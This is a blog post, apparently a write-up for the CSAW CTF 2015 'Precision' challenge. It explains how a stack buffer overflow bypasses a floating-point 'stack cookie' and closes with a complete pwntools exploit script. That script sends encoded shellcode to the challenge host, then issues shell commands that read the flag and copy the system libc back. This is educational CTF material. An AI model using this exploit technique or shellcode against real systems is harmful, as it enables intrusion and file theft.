<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>CSAW CTF 2015 - Precision &#8211; A Little (1 << 3) + y</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Floating point values do not make good stack cookies">
    <meta name="author" content="Chris">
    <meta name="keywords" content="ctf, exploit, overflow">
    <link rel="canonical" href="http://localhost:4000/ctf/exploit/overflow/2015/09/28/csaw-ctf-precision/">
    <link rel="alternate" type="application/rss+xml" title="RSS Feed for A Little (1 << 3) + y" href="/feed.xml" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/pixyll.css?201807100044" type="text/css">
    <link rel="stylesheet" href="/css/prism.css?201807100044" type="text/css">

    <!-- Fonts -->
    <link href='//fonts.googleapis.com/css?family=Merriweather:900,900italic,300,300italic' rel='stylesheet' type='text/css'>
    <link href='//fonts.googleapis.com/css?family=Lato:900,300' rel='stylesheet' type='text/css'>
    
      <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
    


    <!-- Open Graph -->
    <!-- From: https://github.com/mmistakes/hpstr-jekyll-theme/blob/master/_includes/head.html -->
    <meta property="og:locale" content="en_US">
    <meta property="og:type" content="article">
    <meta property="og:title" content="CSAW CTF 2015 - Precision">
    <meta property="og:description" content="Blades out like Wolverine, but it was all a huge act man. ~ octobersveryown">
    <meta property="og:url" content="http://localhost:4000/ctf/exploit/overflow/2015/09/28/csaw-ctf-precision/">
    <meta property="og:site_name" content="A Little (1 &lt;&lt; 3) + y">

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary" />
    
        <meta name="twitter:site" content="@breadchris" />
    
    <meta name="twitter:title" content="CSAW CTF 2015 - Precision" />
    <meta name="twitter:description" content="Floating point values do not make good stack cookies" />
    <meta name="twitter:url" content="http://localhost:4000/ctf/exploit/overflow/2015/09/28/csaw-ctf-precision/" />

    <!-- Icons -->
    <link rel="apple-touch-icon" sizes="57x57" href="/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="114x114" href="/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="144x144" href="/apple-touch-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="60x60" href="/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="120x120" href="/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="152x152" href="/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon-180x180.png">
    <link rel="icon" type="image/png" href="/favicon-192x192.png" sizes="192x12">
    <link rel="icon" type="image/png" href="/favicon-160x160.png" sizes="160x160">
    <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
    <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
        
    
</head>

<body class="site">
  <div class="site-wrap">
    <header class="site-header px2 px-responsive">
  <div class="mt2 wrap">
    <div class="measure">
      <a href="http://localhost:4000" class="site-title">A Little (1 << 3) + y</a>
      <nav class="site-nav">
        <a href="/about/">About</a>
<a href="/contact/">Contact</a>

      </nav>
      <div class="clearfix"></div>
      
        <div class="social-icons">
  <div class="left">
    
      <a class="fa fa-github" href="https://github.com/breadchris"></a>
    
    
    <a class="fa fa-rss" href="/feed.xml"></a>
    
      <a class="fa fa-twitter" href="https://twitter.com/breadchris"></a>
    
    
    
    
    
  </div>
  <div class="right">
    
    
    
  </div>
</div>
<div class="clearfix"></div>

      
    </div>
  </div>
</header>


    <div class="post p2 p-responsive wrap" role="main">
      <div class="measure">
        


<div class="post-header mb2">
  <h1>CSAW CTF 2015 - Precision</h1>
  <span class="post-meta">Sep 28, 2015</span><br>
    
  <span class="post-meta small">
  
    4 minute read
  
  </span>
</div>

<article class="post-content">
  <h3 id="tl-dr">TL; DR</h3>
<ul>
  <li>Overflow</li>
</ul>

<p>Precision was the lowest point exploitation challenge because it was literally a buffer overflow :3</p>

<p>Let’s start by getting an idea what is up with it:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">vagrant@precise64:~/csawctf$ </span>file precision
prec: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for </span>GNU/Linux 2.6.24, BuildID[sha1]<span class="o">=</span>0xf2c69f92c3f6d68319ee39c0926e84bccdeb0371, not stripped</code></pre></figure>

<p>Alright, and the security mitigations it has:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">vagrant@precise64:~/csawctf$ </span>~/Template/checksec.sh --file precision
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   precfound      NX enabled    No PIE          No RPATH   No RUNPATH   contacts</code></pre></figure>

<p>Oh boy! No NX! So we can put shellcode into our payload :3</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">804856</span><span class="n">f</span><span class="o">:</span>       <span class="k">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="err">]</span>
<span class="mi">8048573</span><span class="o">:</span>       <span class="k">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span><span class="p">,</span><span class="n">eax</span>     <span class="c">; Our input</span>
<span class="mi">8048577</span><span class="o">:</span>       <span class="k">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[esp],</span><span class="mh">0x8048682</span>   <span class="c">; Scanf format string</span>
<span class="mi">804857</span><span class="n">e</span><span class="o">:</span>       <span class="k">call</span>   <span class="mi">8048410</span> <span class="o">&lt;</span><span class="n">__isoc99_scanf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span></code></pre></figure>

<p>Oh man, we have a <code class="highlighter-rouge">scanf</code> that prompts us for our input and stores it in a static buffer.</p>

<p>If we look at the function prologue, we get an idea how big this buffer is:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">8048523</span><span class="o">:</span>       <span class="k">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xa0</span> <span class="c">; Our return address will be around 0xa0 bytes</span></code></pre></figure>

<p>The interesting part of this challenge comes from this part of <code class="highlighter-rouge">main</code>:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">8048583</span><span class="o">:</span>       <span class="k">fld</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x98</span><span class="err">]</span>
<span class="mi">804858</span><span class="n">a</span><span class="o">:</span>       <span class="k">fld</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="n">ds</span><span class="o">:</span><span class="mh">0x8048690</span>
<span class="mi">8048590</span><span class="o">:</span>       <span class="k">fucomip</span> <span class="n">st</span><span class="p">,</span><span class="n">st</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="mi">8048592</span><span class="o">:</span>       <span class="k">fstp</span>   <span class="n">st</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="mi">8048594</span><span class="o">:</span>       <span class="k">jp</span>     <span class="mi">80485</span><span class="n">a9</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mh">0x8c</span><span class="o">&gt;</span>
<span class="mi">8048596</span><span class="o">:</span>       <span class="k">fld</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x98</span><span class="err">]</span>
<span class="mi">804859</span><span class="n">d</span><span class="o">:</span>       <span class="k">fld</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="n">ds</span><span class="o">:</span><span class="mh">0x8048690</span>
<span class="mi">80485</span><span class="n">a3</span><span class="o">:</span>       <span class="k">fucomip</span> <span class="n">st</span><span class="p">,</span><span class="n">st</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="mi">80485</span><span class="n">a5</span><span class="o">:</span>       <span class="k">fstp</span>   <span class="n">st</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="mi">80485</span><span class="n">a7</span><span class="o">:</span>       <span class="k">je</span>     <span class="mi">80485</span><span class="n">c1</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mh">0xa4</span><span class="o">&gt;</span></code></pre></figure>

<p>We see a lot of floating point operations and at the beginning of that code we see a floating point load from <code class="highlighter-rouge">0x8048690</code>. Looking at the beginning of this function we see the same address again:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">8048529</span><span class="o">:</span>       <span class="k">fld</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="n">ds</span><span class="o">:</span><span class="mh">0x8048690</span>
<span class="mi">804852</span><span class="n">f</span><span class="o">:</span>       <span class="k">fstp</span>   <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x98</span><span class="err">]</span></code></pre></figure>

<p>and it is storing the value in a stack based variable meaning it is most likely using this floating point value as a “stack cookie” more or less. So by simply getting the bytes of this floating point value and sticking them into our payload at the right offset as to align them with where the floating point value is located, we pass this check and get our exploit to land :3</p>

<p>Oh yeah, they also give us the address of our buffer in memory, so it is super easy peasy :3</p>

<h3 id="note">Note</h3>
<p>This script also includes an example of how to exfiltrate a libc in case you need it for a higher point problem :3</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"54.173.98.115"</span><span class="p">,</span> <span class="mi">1259</span><span class="p">)</span>


<span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x25\x5e\x31\xc9\xb1\x1e\x80\x3e\x07\x7c\x05\x80\x2e\x07\xeb\x11\x31\xdb\x31\xd2\xb3\x07\xb2\xff\x66\x42\x2a\x1e\x66\x29\xda\x88\x16\x46\xe2\xe2\xeb\x05\xe8\xd6\xff\xff\xff\x38\xc7\x57\x6f\x69\x68\x7a\x6f\x6f\x69\x70\x75\x36\x6f\x36\x36\x36\x36\x90\xea\x57\x90\xe9\x5a\x90\xe8\xb7\x12\xd4\x87</span><span class="s">"</span>

<span class="n">buf</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()[</span><span class="o">-</span><span class="mi">8</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s">"</span><span class="se">\xA5\x31\x5A\x47\x55\x15\x50\x40</span><span class="s">EEEECCCCDDDD"</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="o">+</span><span class="mi">8</span><span class="p">))</span>
<span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"cat flag.txt"</span><span class="p">)</span>
<span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"cat /lib32/libc.so.6"</span><span class="p">)</span>

<span class="n">x</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">while</span> <span class="n">r</span><span class="o">.</span><span class="n">can_recv</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
    <span class="n">x</span> <span class="o">+=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"libc"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">x</span><span class="p">)</span></code></pre></figure>


</article>









      </div>
    </div>
  </div>

  <footer class="center">
  <div class="measure">
    <small>
      Thank you for reading dear reader, and good night...<br />
      Blog made with &lt;3 by Breadchris<br />
      Theme crafted with &lt;3 by <a href="http://johnotander.com">John Otander</a> (<a href="https://twitter.com/4lpine">@4lpine</a>).
    </small>
  </div>
</footer>

</body>
</html>
